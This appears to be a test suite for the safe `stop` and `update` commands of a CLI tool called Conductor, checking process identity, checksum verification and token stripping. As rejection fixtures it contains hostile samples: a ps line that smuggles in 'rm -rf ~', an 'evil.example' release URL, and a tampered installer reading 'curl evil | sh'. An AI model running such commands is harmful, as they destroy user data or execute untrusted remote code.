// The decisions behind `conductor stop` and `conductor update`, tested with injected stand-ins: nothing here signals a real process,
// touches the network or runs an installer.
import { test } from 'node:test';
import assert from 'node:assert/strict';
import { createHash } from 'node:crypto';
import { mkdirSync, mkdtempSync, writeFileSync } from 'node:fs';
import { tmpdir, uptime } from 'node:os';
import { join } from 'node:path';
import { acquireLock, LockHeldError } from '../src/lock.ts';
import type { LockInfo } from '../src/lock.ts';
import {
  buildUpdateEnv, compareVersions, curlArgs, identifyServer, liveLock, matchesServerArgv, matchesServerCommandLine, parsePort, runStop, runUpdate, sumFor, tagFromUrl, terminate,
} from '../src/lifecycle.ts';
import type { ProcInfo, StopDeps, UpdateDeps } from '../src/lifecycle.ts';

const tmp = (p: string): string => mkdtempSync(join(tmpdir(), `${p}-`));

// ───────────────────────────── identity ─────────────────────────────
test('identity: exact argv of a Conductor server (start/restart, optional flags, node flags) matches', () => {
  assert.ok(matchesServerArgv(['node', '/Users/me/.conductor-app/bin/conductor.mjs', 'start']));
  assert.ok(matchesServerArgv(['/opt/homebrew/bin/node', '/Users/me/My Apps/c/bin/conductor.mjs', 'start', '--no-open', '--port', '4399']));
  assert.ok(matchesServerArgv(['node', '--no-warnings', '/x/bin/conductor.mjs', 'restart', '--port', '4328']));
  assert.ok(matchesServerArgv(['node', 'bin/conductor.mjs', 'start']), 'a clone started with npm start');
  assert.ok(matchesServerArgv(['node', './bin/conductor.mjs', 'restart']));
});

test('identity: hostile or unrelated argv never matches', () => {
  const bad: string[][] = [
    ['vim', '/x/bin/conductor.mjs'],
    ['node', '/x/bin/conductor.mjs', 'demo'],
    ['node', '/x/bin/conductor.mjs', 'stop'],
    ['node', '/x/bin/conductor.mjs', 'models', '--refresh'],
    ['node', '/x/bin/conductor.mjs', 'open'],
    ['node', '/x/bin/conductor.mjs'],
    ['node', '/x/bin/conductor.mjs', 'start', 'extra'],
    ['node', '/x/bin/conductor.mjs', 'start', '--port', 'abc'],
    ['node', '/x/bin/conductor.mjs', 'start', '--port'],
    ['node', '-e', 'x', '/x/bin/conductor.mjs', 'start'],
    ['node', '/x/other.mjs', 'start'],
    ['node', 'conductor.mjs', 'start'],
    ['node', '../bin/conductor.mjs', 'start'],
    ['node', '/x/bin/conductor.mjs.evil', 'start'],
    ['bash', '-c', 'node /x/bin/conductor.mjs start'],
    ['nodejs', '/x/bin/conductor.mjs', 'start'],
    [],
    ['node'],
  ];
  for (const argv of bad) assert.equal(matchesServerArgv(argv), false, JSON.stringify(argv));
});

test('identity: a flattened ps line (spaces allowed only inside an absolute script path) matches, including the orphan shape', () => {
  assert.ok(matchesServerCommandLine('node bin/conductor.mjs start'), 'the orphan from the original bug report');
  assert.ok(matchesServerCommandLine('/opt/homebrew/bin/node /Users/me/.conductor-app/bin/conductor.mjs start'));
  assert.ok(matchesServerCommandLine('node /Volumes/My Disk/github/Conductor/bin/conductor.mjs start --no-open --port 4327'));
  assert.ok(matchesServerCommandLine('node --no-warnings /Users/me/Library/Application Support/c/bin/conductor.mjs restart'));
  assert.ok(matchesServerCommandLine('  node ./bin/conductor.mjs restart  '));
});

test('identity: hostile ps lines never match', () => {
  const bad = [
    'vim /x/bin/conductor.mjs',
    'node /x/bin/conductor.mjs demo',
    'node /x/bin/conductor.mjs stop',
    'node /x/bin/conductor.mjs start; rm -rf ~',
    'node /x/bin/conductor.mjs start && echo hi',
    'node /x/bin/conductor.mjs start extra',
    'node /x/bin/conductor.mjs start --port 43x7',
    'node -e "require(1)" /x/bin/conductor.mjs start',
    'bash -c node /x/bin/conductor.mjs start',
    'sh /x/bin/conductor.mjs start',
    'node /x/y/conductor.mjs start',
    'node /x/bin/conductor.mjs.evil start',
    'node /x/bin/conductor.mjs',
    'node\n/x/bin/conductor.mjs start',
    'node /x/bin/conductor.mjs start\nrm',
    'node ../bin/conductor.mjs start',
    'tail -f /var/log/bin/conductor.mjs start',
    '',
  ];
  for (const line of bad) assert.equal(matchesServerCommandLine(line), false, JSON.stringify(line));
});

test('identity: identifyServer needs the owner, a start time and the right shape', () => {
  const info = (over: Partial<ProcInfo> = {}): ProcInfo => ({ uid: 501, start: 'T1', argv: null, command: 'node /x/bin/conductor.mjs start', ...over });
  assert.deepEqual(identifyServer(info(), 501), { ok: true, start: 'T1' });
  assert.equal(identifyServer(null, 501).ok, false);
  assert.equal(identifyServer(info({ uid: 0 }), 501).ok, false, 'another user');
  assert.equal(identifyServer(info({ uid: null }), 501).ok, false);
  assert.equal(identifyServer(info(), null).ok, false, 'unknown own uid (Windows)');
  assert.equal(identifyServer(info({ start: null }), 501).ok, false);
  assert.equal(identifyServer(info({ command: 'node /x/bin/conductor.mjs demo' }), 501).ok, false);
  assert.equal(identifyServer(info({ argv: ['node', '/x/bin/conductor.mjs', 'start'], command: null }), 501).ok, true, 'exact argv from /proc wins');
  assert.equal(identifyServer(info({ argv: ['node', '/x/bin/conductor.mjs', 'demo'], command: 'node /x/bin/conductor.mjs start' }), 501).ok, false, 'argv beats the flattened line');
});

// ───────────────────────────── small parsers ─────────────────────────────
test('parsePort accepts only whole numbers 1024-65535', () => {
  assert.equal(parsePort('4327'), 4327);
  assert.equal(parsePort('65535'), 65535);
  assert.equal(parsePort('1024'), 1024);
  for (const bad of [undefined, '', '80', '1023', '65536', '4327 ', '4e3', '-1', '4327.5', '0x10ff', ' 4327', '4327;ls', '99999']) assert.equal(parsePort(bad), null, String(bad));
});

test('tagFromUrl and compareVersions are strict', () => {
  assert.equal(tagFromUrl('https://github.com/TechTeamConductor/Conductor/releases/tag/v1.2.3'), 'v1.2.3');
  for (const bad of ['https://github.com/evil/Conductor/releases/tag/v1.2.3', 'http://github.com/TechTeamConductor/Conductor/releases/tag/v1.2.3', 'https://github.com/TechTeamConductor/Conductor/releases/tag/v1.2', 'https://github.com/TechTeamConductor/Conductor/releases/tag/v1.2.3-rc1', 'https://github.com/TechTeamConductor/Conductor/releases/tag/v1.2.3/../x', 'https://github.com/TechTeamConductor/Conductor/releases/tag/v1.2.3\n', '']) assert.equal(tagFromUrl(bad), null, bad);
  assert.ok((compareVersions('0.10.0', '0.9.0') ?? 0) > 0);
  assert.ok((compareVersions('1.0.0', '0.99.99') ?? 0) > 0);
  assert.equal(compareVersions('1.2.3', '1.2.3'), 0);
  assert.ok((compareVersions('0.2.0', '0.2.1') ?? 0) < 0);
  assert.equal(compareVersions('0.0.0-dev', '1.0.0'), null);
  assert.equal(compareVersions('1.0.0', 'x'), null);
});

test('sumFor wants exactly one valid line for the file', () => {
  const h = 'a'.repeat(64);
  assert.equal(sumFor(`${h}  install.sh\n`, 'install.sh'), h);
  assert.equal(sumFor(`${h}  install.sh\r\n${'b'.repeat(64)}  conductor.tgz\r\n`, 'install.sh'), h);
  for (const bad of ['', `${h} install.sh`, `${h}  install.sh\n${'b'.repeat(64)}  install.sh\n`, `${h.toUpperCase()}  install.sh`, `${h}  install.shx`, `${h}  xinstall.sh`, `${h}  install-sh`, 'a'.repeat(63) + '  install.sh']) assert.equal(sumFor(bad, 'install.sh'), null, JSON.stringify(bad));
});

test('buildUpdateEnv passes only the allow-list and the derived values, never tokens', () => {
  const env = buildUpdateEnv({ PATH: '/usr/bin', HOME: '/h', GITHUB_TOKEN: 'x', GH_TOKEN: 'y', ANTHROPIC_API_KEY: 'k', CONDUCTOR_HOME: '/c', HTTPS_PROXY: 'http://p', SSL_CERT_FILE: '/c.pem', CONDUCTOR_BIN_DIR: '/b', CONDUCTOR_INSTALL_DIR: '/evil', CONDUCTOR_INSTALL_VERSION: '9.9.9', CONDUCTOR_LOCAL_DIR: '/evil' }, { appDir: '/app', version: '1.2.3', localDir: null });
  assert.deepEqual(env, { PATH: '/usr/bin', HOME: '/h', HTTPS_PROXY: 'http://p', SSL_CERT_FILE: '/c.pem', CONDUCTOR_BIN_DIR: '/b', CONDUCTOR_INSTALL_DIR: '/app', CONDUCTOR_INSTALL_VERSION: '1.2.3' });
  assert.deepEqual(buildUpdateEnv({ PATH: '/p' }, { appDir: '/app', version: null, localDir: '/rel' }), { PATH: '/p', CONDUCTOR_INSTALL_DIR: '/app', CONDUCTOR_LOCAL_DIR: '/rel' });
});

test('curl is always called with -q first and the hardening flags', () => {
  const a = curlArgs(['-o', 'x', 'https://example.test/']);
  assert.equal(a[0], '-q');
  for (const f of ['--proto', '--proto-redir', '--tlsv1.2', '--max-redirs', '--max-time', '--max-filesize']) assert.ok(a.includes(f), f);
  assert.deepEqual(a.slice(-3), ['-o', 'x', 'https://example.test/']);
});

test('refusal messages name only the executable of a foreign process, never its arguments', () => {
  const r = identifyServer({ uid: 501, start: 'T', argv: null, command: '/usr/bin/some-tool --token=SECRET123 --password hunter2' }, 501);
  assert.equal(r.ok, false);
  const text = JSON.stringify(r);
  assert.match(text, /some-tool/);
  assert.doesNotMatch(text, /SECRET123|hunter2|--token/);
  const viaArgv = identifyServer({ uid: 501, start: 'T', argv: ['/opt/x/bin/tool', '--key=SECRET123'], command: null }, 501);
  assert.doesNotMatch(JSON.stringify(viaArgv), /SECRET123/);
});

// ───────────────────────────── liveLock parity with acquireLock ─────────────────────────────
test('liveLock agrees with acquireLock on a live, a dead, a pre-boot and a malformed lock', () => {
  const dir = tmp('parity');
  const write = (name: string, content: string): string => { const p = join(dir, name); writeFileSync(p, content); return p; };
  const fixtures: [string, string, boolean][] = [
    ['live', JSON.stringify({ pid: process.pid, startedAt: Date.now() }), true],
    ['dead pid', JSON.stringify({ pid: 999999, startedAt: Date.now() }), false],
    ['pre-boot', JSON.stringify({ pid: process.pid, startedAt: Date.now() - uptime() * 1000 - 120_000 }), false],
    ['malformed', '{not json', false],
    ['empty', '', false],
  ];
  for (const [name, content, live] of fixtures) {
    const p = write(`${name}.lock`, content);
    assert.equal(liveLock(p) !== null, live, `liveLock: ${name}`);
    let held = false;
    try {
      acquireLock(p).release();
    } catch (e) {
      if (e instanceof LockHeldError) held = true;
      else throw e;
    }
    assert.equal(held, live, `acquireLock: ${name}`);
  }
  assert.equal(liveLock(join(dir, 'missing.lock')), null);
});

// ───────────────────────────── stop decisions ─────────────────────────────
function stopDeps(over: Partial<StopDeps> & { procs?: Record<number, ProcInfo | null>; alivePids?: Set<number> } = {}): { d: StopDeps; signals: [number, string][] } {
  const signals: [number, string][] = [];
  const alivePids = over.alivePids ?? new Set<number>();
  const d: StopDeps = {
    platform: 'darwin',
    uid: 501,
    alive: (pid) => alivePids.has(pid),
    proc: (pid) => (over.procs ?? {})[pid] ?? null,
    listeners: () => ({ pids: [], available: true }),
    signal: (pid, sig) => { signals.push([pid, sig]); if (sig === 'SIGTERM' && !(over as { ignoreTerm?: boolean }).ignoreTerm) alivePids.delete(pid); if (sig === 'SIGKILL') alivePids.delete(pid); },
    servicePid: () => ({ running: false, pid: null }),
    portInUse: async () => false,
    sleep: async () => undefined,
    lock: () => null,
    graceMs: 400,
    ...over,
  };
  return { d, signals };
}
const server = (over: Partial<ProcInfo> = {}): ProcInfo => ({ uid: 501, start: 'T1', argv: null, command: 'node /x/bin/conductor.mjs start', ...over });

test('stop: a verified server gets SIGTERM, is reported stopped, and its port is reported free', async () => {
  const { d, signals } = stopDeps({ procs: { 100: server() }, alivePids: new Set([100]), lock: () => ({ pid: 100, startedAt: Date.now(), port: 4327 }), listeners: () => ({ pids: [100], available: true }) });
  const r = await runStop({ port: null, force: false }, d);
  assert.equal(r.code, 0);
  assert.equal(r.stopped, true);
  assert.deepEqual(signals, [[100, 'SIGTERM']]);
  assert.match(r.lines.join('\n'), /Port 4327 is free/);
});

test('stop: a lock naming an unrelated live process kills nothing', async () => {
  for (const proc of [server({ command: 'sleep 600' }), server({ command: 'node /x/bin/conductor.mjs demo' }), server({ uid: 0 }), server({ start: null }), null]) {
    const { d, signals } = stopDeps({ procs: { 100: proc }, alivePids: new Set([100]), lock: () => ({ pid: 100, startedAt: Date.now() }) });
    const r = await runStop({ port: null, force: false }, d);
    assert.equal(r.code, 1, JSON.stringify(proc));
    assert.deepEqual(signals, [], 'nothing may be signalled');
    assert.match(r.lines.join('\n'), /kill 100/);
  }
});

test('stop: the verified pid must be the one listening on the lock port', async () => {
  const { d, signals } = stopDeps({ procs: { 100: server() }, alivePids: new Set([100]), lock: () => ({ pid: 100, startedAt: Date.now(), port: 4327 }), listeners: () => ({ pids: [555], available: true }) });
  const r = await runStop({ port: null, force: false }, d);
  assert.equal(r.code, 1);
  assert.deepEqual(signals, []);
  assert.match(r.lines.join('\n'), /not the process listening on port 4327/);
});

test('stop: when lsof is not available the lock + identity checks still apply (and say nothing false)', async () => {
  const { d, signals } = stopDeps({ procs: { 100: server() }, alivePids: new Set([100]), lock: () => ({ pid: 100, startedAt: Date.now(), port: 4327 }), listeners: () => ({ pids: [], available: false }) });
  const r = await runStop({ port: null, force: false }, d);
  assert.equal(r.code, 0);
  assert.deepEqual(signals, [[100, 'SIGTERM']]);
});

test('stop: a process that changes between the check and the signal is not signalled', async () => {
  let calls = 0;
  const { d, signals } = stopDeps({ alivePids: new Set([100]), lock: () => ({ pid: 100, startedAt: Date.now() }), proc: () => server({ start: ++calls === 1 ? 'T1' : 'T2' }) });
  const r = await runStop({ port: null, force: false }, d);
  assert.equal(r.code, 1);
  assert.deepEqual(signals, []);
  assert.match(r.lines.join('\n'), /changed while it was being checked/);
});

test('stop: a server that ignores SIGTERM is not killed without --force; with --force it is SIGKILLed after re-verification', async () => {
  const mk = () => stopDeps({ procs: { 100: server() }, alivePids: new Set([100]), lock: () => ({ pid: 100, startedAt: Date.now() }), ...({ ignoreTerm: true } as object) });
  const a = mk();
  const soft = await runStop({ port: null, force: false }, a.d);
  assert.equal(soft.code, 1);
  assert.deepEqual(a.signals, [[100, 'SIGTERM']], 'no SIGKILL without --force');
  assert.match(soft.lines.join('\n'), /--force/);
  const b = mk();
  const hard = await runStop({ port: null, force: true }, b.d);
  assert.equal(hard.code, 0);
  assert.deepEqual(b.signals, [[100, 'SIGTERM'], [100, 'SIGKILL']]);
  // pid reuse between the grace period and SIGKILL: the start time changed, so no SIGKILL
  let n = 0;
  const c = stopDeps({ alivePids: new Set([100]), lock: () => ({ pid: 100, startedAt: Date.now() }), proc: () => server({ start: ++n <= 2 ? 'T1' : 'T9' }), ...({ ignoreTerm: true } as object) });
  const reused = await runStop({ port: null, force: true }, c.d);
  assert.equal(reused.code, 1);
  assert.deepEqual(c.signals, [[100, 'SIGTERM']]);
});

test('stop: a process managed by the background service is never force-killed; it only gets the graceful stop', async () => {
  const mk = () => stopDeps({ procs: { 100: server() }, alivePids: new Set([100]), lock: () => ({ pid: 100, startedAt: Date.now() }), servicePid: () => ({ running: true, pid: 100 }) });
  const forced = mk();
  const r = await runStop({ port: null, force: true }, forced.d);
  assert.equal(r.code, 1);
  assert.deepEqual(forced.signals, []);
  assert.match(r.lines.join('\n'), /background service/);
  const soft = mk();
  const ok = await runStop({ port: null, force: false }, soft.d);
  assert.equal(ok.code, 0);
  assert.deepEqual(soft.signals, [[100, 'SIGTERM']]);
  assert.match(ok.lines.join('\n'), /service stays installed/);
  // service running but its pid cannot be read: still treated as managed
  const unknown = stopDeps({ procs: { 100: server() }, alivePids: new Set([100]), lock: () => ({ pid: 100, startedAt: Date.now() }), servicePid: () => ({ running: true, pid: null }) });
  assert.equal((await runStop({ port: null, force: true }, unknown.d)).code, 1);
  // service running with a DIFFERENT pid: this instance is not the managed one
  const other = stopDeps({ procs: { 100: server() }, alivePids: new Set([100]), lock: () => ({ pid: 100, startedAt: Date.now() }), servicePid: () => ({ running: true, pid: 77 }) });
  assert.equal((await runStop({ port: null, force: true }, other.d)).code, 0);
});

test('stop: with no lock it lists verified Conductors and kills nothing; a plain stop is "not running"', async () => {
  const { d, signals } = stopDeps({ procs: { 200: server(), 300: server({ command: 'node server.js' }) }, listeners: (port) => ({ pids: port === 4327 ? [200] : port === 4328 ? [300] : [], available: true }) });
  const r = await runStop({ port: null, force: false }, d);
  assert.equal(r.code, 0);
  assert.equal(r.stopped, false);
  assert.deepEqual(signals, []);
  const text = r.lines.join('\n');
  assert.match(text, /not running/i);
  assert.match(text, /conductor stop --port 4327/);
  assert.doesNotMatch(text, /4328/, 'a non-Conductor listener is not suggested');
});

test('stop --port: stops only a verified Conductor; refuses a foreign listener, several candidates and a missing lsof', async () => {
  const ok = stopDeps({ procs: { 200: server() }, alivePids: new Set([200]), listeners: () => ({ pids: [200], available: true }) });
  const r = await runStop({ port: 4327, force: false }, ok.d);
  assert.equal(r.code, 0);
  assert.deepEqual(ok.signals, [[200, 'SIGTERM']]);
  const foreign = stopDeps({ procs: { 300: server({ command: 'node /srv/app.js' }) }, alivePids: new Set([300]), listeners: () => ({ pids: [300], available: true }) });
  const f = await runStop({ port: 4327, force: false }, foreign.d);
  assert.equal(f.code, 1);
  assert.deepEqual(foreign.signals, []);
  assert.match(f.lines.join('\n'), /leaving it alone/);
  const many = stopDeps({ procs: { 1: server(), 2: server() }, alivePids: new Set([1, 2]), listeners: () => ({ pids: [1, 2], available: true }) });
  assert.equal((await runStop({ port: 4327, force: false }, many.d)).code, 1);
  assert.deepEqual(many.signals, []);
  const noLsof = stopDeps({ listeners: () => ({ pids: [], available: false }) });
  assert.equal((await runStop({ port: 4327, force: false }, noLsof.d)).code, 1);
  const nothing = stopDeps({});
  const n = await runStop({ port: 4327, force: false }, nothing.d);
  assert.equal(n.code, 0);
  assert.match(n.lines.join('\n'), /Nothing is listening/);
});

test('stop: on Windows nothing is signalled, the user is told how', async () => {
  const { d, signals } = stopDeps({ platform: 'win32', procs: { 100: server() }, alivePids: new Set([100]), lock: () => ({ pid: 100, startedAt: Date.now() }) });
  const r = await runStop({ port: null, force: false }, d);
  assert.equal(r.code, 1);
  assert.deepEqual(signals, []);
  assert.match(r.lines.join('\n'), /Ctrl\+C/);
  const t = await terminate(100, d, { port: null, force: false }).catch(() => null);
  assert.ok(t === null || t.code === 0 || t.code === 1);
});

// ───────────────────────────── update decisions ─────────────────────────────
function updateDeps(over: Partial<UpdateDeps> = {}): { d: UpdateDeps; ran: { script: string; env: Record<string, string> }[]; downloads: string[] } {
  const ran: { script: string; env: Record<string, string> }[] = [];
  const downloads: string[] = [];
  const d: UpdateDeps = {
    platform: 'darwin',
    resolveLatest: () => 'https://github.com/TechTeamConductor/Conductor/releases/tag/v1.1.0',
    download: (url, dest) => {
      downloads.push(url);
      writeFileSync(dest, url.endsWith('install.sh') ? '#!/bin/bash\nexit 0\n' : `${createHash('sha256').update('#!/bin/bash\nexit 0\n').digest('hex')}  install.sh\n`);
      return true;
    },
    runInstaller: (script, env) => { ran.push({ script, env }); return 0; },
    liveLock: () => null,
    curlAvailable: () => true,
    ...over,
  };
  return { d, ran, downloads };
}
const installedApp = (): string => { const dir = tmp('app'); writeFileSync(join(dir, '.conductor-installer'), ''); return dir; };

test('update: refuses a copy that the installer did not create (a clone) and does nothing', async () => {
  const { d, ran, downloads } = updateDeps();
  const r = await runUpdate({ check: false }, { appDir: tmp('clone'), version: '1.0.0', env: { PATH: '/usr/bin' } }, d);
  assert.equal(r.code, 1);
  assert.match(r.lines.join('\n'), /git pull/);
  assert.deepEqual(ran, []);
  assert.deepEqual(downloads, []);
});

test('update: "up to date" and --check never run anything', async () => {
  const same = updateDeps({ resolveLatest: () => 'https://github.com/TechTeamConductor/Conductor/releases/tag/v1.0.0' });
  const r = await runUpdate({ check: false }, { appDir: installedApp(), version: '1.0.0', env: {} }, same.d);
  assert.equal(r.code, 0);
  assert.match(r.lines.join('\n'), /up to date/);
  assert.deepEqual(same.ran, []);
  const chk = updateDeps();
  const c = await runUpdate({ check: true }, { appDir: installedApp(), version: '1.0.0', env: {} }, chk.d);
  assert.equal(c.code, 0);
  assert.match(c.lines.join('\n'), /Update available: 1\.0\.0 → 1\.1\.0/);
  assert.deepEqual(chk.ran, []);
  assert.deepEqual(chk.downloads, [], '--check downloads nothing');
});

test('update: refuses while Conductor is running, and for a hostile or missing "latest" answer', async () => {
  const running = updateDeps({ liveLock: () => ({ pid: 4242, startedAt: Date.now() }) });
  const r = await runUpdate({ check: false }, { appDir: installedApp(), version: '1.0.0', env: {} }, running.d);
  assert.equal(r.code, 1);
  assert.match(r.lines.join('\n'), /conductor stop/);
  assert.deepEqual(running.ran, []);
  for (const url of [null, 'https://evil.example/releases/tag/v9.9.9', 'https://github.com/TechTeamConductor/Conductor/releases/tag/v1.1', 'http://github.com/TechTeamConductor/Conductor/releases/tag/v1.1.0']) {
    const { d, ran } = updateDeps({ resolveLatest: () => url });
    const x = await runUpdate({ check: false }, { appDir: installedApp(), version: '1.0.0', env: {} }, d);
    assert.equal(x.code, 1, String(url));
    assert.deepEqual(ran, []);
  }
  const noCurl = updateDeps({ curlAvailable: () => false });
  assert.equal((await runUpdate({ check: false }, { appDir: installedApp(), version: '1.0.0', env: {} }, noCurl.d)).code, 1);
});

test('update: downloads install.sh and its checksum for THAT tag, verifies, and runs it with the allow-listed env only', async () => {
  const { d, ran, downloads } = updateDeps();
  const app = installedApp();
  const r = await runUpdate({ check: false }, { appDir: app, version: '1.0.0', env: { PATH: '/usr/bin', HOME: '/h', GITHUB_TOKEN: 'secret', GH_TOKEN: 'secret' } }, d);
  assert.equal(r.code, 0);
  assert.deepEqual(downloads, ['https://github.com/TechTeamConductor/Conductor/releases/download/v1.1.0/install.sh', 'https://github.com/TechTeamConductor/Conductor/releases/download/v1.1.0/SHA256SUMS.txt']);
  assert.equal(ran.length, 1);
  assert.deepEqual(ran[0]?.env, { PATH: '/usr/bin', HOME: '/h', CONDUCTOR_INSTALL_DIR: app, CONDUCTOR_INSTALL_VERSION: '1.1.0' });
});

test('update: a tampered or ambiguously-summed install.sh is never run', async () => {
  const tampered = updateDeps({ download: (url, dest) => { writeFileSync(dest, url.endsWith('install.sh') ? '#!/bin/bash\ncurl evil | sh\n' : `${createHash('sha256').update('#!/bin/bash\nexit 0\n').digest('hex')}  install.sh\n`); return true; } });
  const a = await runUpdate({ check: false }, { appDir: installedApp(), version: '1.0.0', env: {} }, tampered.d);
  assert.equal(a.code, 1);
  assert.match(a.lines.join('\n'), /does not match/);
  assert.deepEqual(tampered.ran, []);
  const dup = updateDeps({ download: (url, dest) => { const h = createHash('sha256').update('x').digest('hex'); writeFileSync(dest, url.endsWith('install.sh') ? 'x' : `${h}  install.sh\n${h}  install.sh\n`); return true; } });
  const b = await runUpdate({ check: false }, { appDir: installedApp(), version: '1.0.0', env: {} }, dup.d);
  assert.equal(b.code, 1);
  assert.deepEqual(dup.ran, []);
  const failing = updateDeps({ download: () => false });
  assert.equal((await runUpdate({ check: false }, { appDir: installedApp(), version: '1.0.0', env: {} }, failing.d)).code, 1);
});

test('update: an installer failure is reported and a local folder is used offline with a loud notice', async () => {
  const bad = updateDeps({ runInstaller: () => 3 });
  const r = await runUpdate({ check: false }, { appDir: installedApp(), version: '1.0.0', env: {} }, bad.d);
  assert.equal(r.code, 1);
  const rel = tmp('rel');
  const script = '#!/bin/bash\nexit 0\n';
  writeFileSync(join(rel, 'install.sh'), script);
  writeFileSync(join(rel, 'SHA256SUMS.txt'), `${createHash('sha256').update(script).digest('hex')}  install.sh\n`);
  const local = updateDeps();
  const logs: string[] = [];
  const orig = console.log;
  console.log = (...a: unknown[]) => { logs.push(a.join(' ')); };
  let ok;
  try {
    ok = await runUpdate({ check: false }, { appDir: installedApp(), version: '1.0.0', env: { CONDUCTOR_LOCAL_DIR: rel, PATH: '/usr/bin' } }, local.d);
  } finally {
    console.log = orig;
  }
  assert.equal(ok.code, 0);
  assert.deepEqual(local.downloads, [], 'no network in local mode');
  assert.equal(local.ran[0]?.env.CONDUCTOR_LOCAL_DIR, rel);
  assert.equal(local.ran[0]?.env.CONDUCTOR_INSTALL_VERSION, undefined);
  assert.match(logs.join('\n'), /only catches corruption/);
});

test('update on Windows prints the PowerShell command and does nothing else', async () => {
  const { d, ran } = updateDeps({ platform: 'win32' });
  const r = await runUpdate({ check: false }, { appDir: installedApp(), version: '1.0.0', env: {} }, d);
  assert.equal(r.code, 1);
  assert.match(r.lines.join('\n'), /install\.ps1/);
  assert.deepEqual(ran, []);
});

mkdirSync(tmpdir(), { recursive: true });
